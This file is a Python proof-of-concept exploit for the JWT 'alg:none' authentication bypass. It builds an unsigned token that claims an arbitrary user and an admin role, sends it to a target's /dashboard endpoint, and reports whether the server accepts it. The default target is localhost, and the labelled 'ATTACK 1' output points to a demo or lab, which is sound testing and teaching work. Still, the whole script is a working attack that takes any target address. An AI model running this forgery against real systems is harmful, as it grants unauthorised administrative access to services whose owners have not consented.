import base64, json, requests, argparse, sys

TARGET = "http://127.0.0.1:5000"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_token(user: str, role: str) -> str:
    header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"user": user, "role": role}).encode())
    return f"{header}.{payload}."   # empty signature — no signing key needed

def main():
    parser = argparse.ArgumentParser(description="JWT alg:none bypass PoC")
    parser.add_argument("--target", default=TARGET)
    parser.add_argument("--user",   default="attacker")
    parser.add_argument("--role",   default="admin")
    parser.add_argument("--demo",   action="store_true", help="verbose step-by-step output")
    args = parser.parse_args()

    if args.demo:
        print("\n[*] ATTACK 1: JWT alg:none bypass")
        print("[*] Server trusts the 'alg' field inside the JWT header.")
        print("[*] We set alg=none and strip the signature entirely.\n")

    token = forge_token(args.user, args.role)

    if args.demo:
        _, payload_part, _ = token.split(".")
        decoded = json.loads(base64.urlsafe_b64decode(payload_part + "=="))
        print(f"[+] Forged token:\n    {token}\n")
        print(f"[+] Decoded payload: {json.dumps(decoded, indent=2)}\n")
        print(f"[*] Sending to {args.target}/dashboard ...\n")

    resp = requests.get(
        f"{args.target}/dashboard",
        headers={"Authorization": f"Bearer {token}"}
    )

    if args.demo:
        print(f"{'[+]' if resp.status_code == 200 else '[-]'} Server responded {resp.status_code}\n")

    if resp.status_code == 200:
        print("[!] VULNERABLE — server accepted unsigned token:")
        print(json.dumps(resp.json(), indent=2))
        sys.exit(0)
    else:
        print("[-] Server rejected the token (patched).")
        print(resp.json())
        sys.exit(1)

if __name__ == "__main__":
    main()
